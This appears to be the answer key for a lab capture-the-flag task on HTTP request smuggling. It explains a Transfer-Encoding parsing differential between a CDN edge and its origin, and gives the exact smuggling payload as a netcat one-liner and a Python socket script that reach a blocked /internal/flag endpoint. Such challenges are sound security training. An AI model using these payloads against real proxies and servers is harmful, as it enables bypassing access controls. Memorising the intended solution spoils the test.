# http/smuggle-te-te — SmuggleTeTe (location-locked, critical)

**EdgeMesh CDN**: raw-TCP edge front (`:8080`) → origin app (`:8081`). Both sides parse `Transfer-Encoding: chunked` — the desync is a **serializer differential** on the forwarded request. **Raw sockets only** (arch §8).

**Bug (TE.TE):** when the front re-serializes a chunked request it (1) mangles the header name to `Transfer-Encoding-: chunked` (trailing dash) — the origin's strict parser does not recognize it as Transfer-Encoding (unlike the classic space/`xchunked` obfuscations, which the origin hard-rejects with 400, this form is silently treated as an unknown header) — and (2) writes `Content-Length` from its framing record = the **first chunk's size**, while emitting the **full de-chunked body**. The origin, seeing no recognizable TE, frames by the too-short CL → everything after the first chunk's bytes becomes the origin's next request.
**Lock:** the origin serves `GET /internal/flag`; the edge answers **403** for every request it parses whose path starts with `/internal` (hide the smuggled request as a **later chunk** — the front consumes all chunk data as one body and never parses it).

## Intended path (exact bytes, single connection)
```sh
printf 'POST /home HTTP/1.1\r\nHost: victim.target.lab:8119\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nAAAA\r\n3d\r\nGET /internal/flag HTTP/1.1\r\nHost: victim.target.lab:8119\r\n\r\n\r\n0\r\n\r\n' | nc victim.target.lab 8119
```
- Chunk 1 = `AAAA` (4 bytes — becomes the forwarded `Content-Length: 4`); chunk 2 = the 61-byte (`0x3d`) smuggled request; then the terminating `0` chunk.
- The front de-chunks both chunks and forwards `POST /home` with `Transfer-Encoding-: chunked` + `Content-Length: 4` + all 65 body bytes; the origin reads `AAAA` as the body and parses the smuggled request next.
- You receive two responses: the `POST /home` response, then the smuggled `GET /internal/flag` response containing the flag.

Python:
```python
import socket
smug = b"GET /internal/flag HTTP/1.1\r\nHost: victim.target.lab:8119\r\n\r\n"  # 61 bytes = 0x3d
p = (b"POST /home HTTP/1.1\r\nHost: victim.target.lab:8119\r\n"
     b"Transfer-Encoding: chunked\r\n\r\n"
     b"4\r\nAAAA\r\n" + hex(len(smug))[2:].encode() + b"\r\n" + smug + b"\r\n0\r\n\r\n")
s = socket.create_connection(("victim.target.lab", 8119)); s.sendall(p)
import time; time.sleep(1); print(s.recv(65536).decode("latin1"))
```

**Flag:** `DSLTV{HTTP-SmuggleTeTe-<9 digits>}` (from the origin's `/internal/flag`, only reachable via the desync).
